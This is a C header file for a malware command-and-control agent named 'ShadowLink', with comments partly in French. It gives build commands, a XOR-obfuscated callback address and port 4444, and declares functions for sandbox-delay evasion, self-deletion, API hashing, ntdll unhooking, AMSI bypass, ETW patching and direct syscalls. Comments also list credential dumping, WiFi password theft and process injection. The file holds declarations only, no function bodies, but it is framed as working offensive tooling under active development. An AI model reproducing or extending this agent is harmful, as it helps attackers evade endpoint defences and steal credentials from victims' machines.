/*
 * ShadowLink C2 Agent
 * Phase 11: Advanced Stealth & EDR Evasion
 *   - HTTPS C2 Communication
 *   - Sleep Obfuscation (Ekko)
 *   - Direct Syscalls (Hell's Gate)
 *   - Previous: WiFi passwords, Credential Dumping, Process Injection
 * 
 * Compilation: 
 *   Debug:   gcc -o agent.exe agent.c aes.c https_transport.c sleep_obfuscation.c syscalls.c -lws2_32 -ladvapi32 -lwinhttp -DAES256=1
 *   Stealth: gcc -o agent.exe agent.c aes.c https_transport.c sleep_obfuscation.c syscalls.c -lws2_32 -ladvapi32 -lwinhttp -DAES256=1 -mwindows
 *   + NASM:  nasm -f win64 syscalls_asm.asm -o syscalls_asm.o (then link syscalls_asm.o)
 */

#ifndef AGENT_H
#define AGENT_H


// Headers Windows SEULEMENT
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

// ============================================
// PHASE 11 MODULES
// ============================================
#include "https_transport.h"
#include "sleep_obfuscation.h"
#include "syscalls.h"

// Configuration - Chiffrées avec XOR key 0x5A
// Ces valeurs seront déchiffrées au runtime
// Original: "127.0.0.1" XOR 0x5A = "k}~4z4z4k"
// Port: 4444 (stocké en clair car int)
#define SERVER_PORT 4444
// HTTPS_PORT est défini dans https_transport.h

// XOR Key pour le déchiffrement des strings
#define XOR_KEY 0x5A

// Délai d'exécution initial (en ms) pour contourner les sandbox
#define INITIAL_DELAY 10000  // 10 secondes

// Phase 11: Use HTTPS by default (0 = TCP, 1 = HTTPS)
#define USE_HTTPS_TRANSPORT 1

// Phase 11: Sleep obfuscation settings
#define SLEEP_OBFUSCATION_ENABLED 1

// ============================================
// PROTOTYPES - BASIC EVASION
// ============================================

void xor_decrypt(char *data, size_t len, unsigned char key);
char* get_decrypted_server_ip(void);
unsigned long djb2_hash(const char *str);
FARPROC resolve_api_by_hash(HMODULE module, unsigned long hash);
int self_delete(void);
int delayed_execution(DWORD delay_ms);
int detect_fast_execution(void);

// ============================================
// PROTOTYPES - PHASE 8: ANTI-EDR
// ============================================

// Direct Syscalls (legacy - now in syscalls.h)
int init_syscall_table(void);
DWORD get_syscall_number(void *ntdll_base, const char *func_name);

// Unhooking ntdll.dll
int unhook_ntdll(void);
int is_function_hooked(void *func_addr);

// AMSI Bypass
int bypass_amsi(void);

// ETW Patching
int patch_etw(void);

// Master function - applies all anti-EDR techniques
int apply_anti_edr(void);

// ============================================
// PROTOTYPES - PHASE 11: STEALTH
// ============================================

// Initialize all Phase 11 modules
int phase11_init(void);

// Main loop with HTTPS and sleep obfuscation
int agent_main_loop_https(void);

#endif

